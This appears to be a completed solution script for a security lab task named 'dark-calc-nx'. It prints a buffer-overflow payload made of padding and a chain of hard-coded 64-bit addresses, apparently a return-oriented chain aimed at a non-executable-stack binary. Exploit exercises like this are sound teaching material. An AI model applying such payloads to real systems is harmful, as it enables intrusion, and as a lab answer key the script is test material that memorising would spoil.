#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = (
    b"AAAAAAAAAAAAAAAAAAAAAAAA"            +       
    b"\x34\x1a\x40\x00\x00\x00\x00\x00"    +  
    b"\x2a\x1a\x40\x00\x00\x00\x00\x00"    +     
    b"\x00\x00\x00\x00\x00\x00\x00\x00"    +       
    b"\x01\x00\x00\x00\x00\x00\x00\x00"    +  
    b"\x38\x20\x60\x00\x00\x00\x00\x00"    +       
    b"\xc0\x1a\x40\x00\x00\x00\x00\x00"    +        
    b"\x41\x00\x00\x00\x00\x00\x00\x00"    +        
    b"\x00\x00\x00\x00\x00\x00\x00\x00"    +        
    b"\x10\x1a\x40\x00\x00\x00\x00\x00"    +        
    b"\x00" * 8                            +        
    b"\x00" * (8 * 6)                      +        
    b"\x34\x1a\x40\x00\x00\x00\x00\x00"    +        
    b"\xb4\x19\x40\x00\x00\x00\x00\x00"            
)

sys.stdout.buffer.write(payload)
